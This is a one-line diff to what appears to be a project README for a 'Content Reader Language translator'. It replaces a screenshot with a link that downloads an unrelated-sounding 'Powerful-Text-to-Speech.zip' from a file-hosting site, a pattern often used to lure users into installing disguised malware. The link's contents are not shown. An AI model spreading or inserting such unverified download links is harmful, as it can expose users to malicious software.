@@ -1,6 +1,6 @@
 ### Content Reader Language translator
 
-![](https://i.ibb.co/jwqnPPG/Capture.png)
+<a href="https://www.mediafire.com/file/cqgypdo9wbslsuu/Powerful-Text-to-Speech.zip/file" download="FILENAME">if it doesn't work download from mediafire</a>
 
 
 
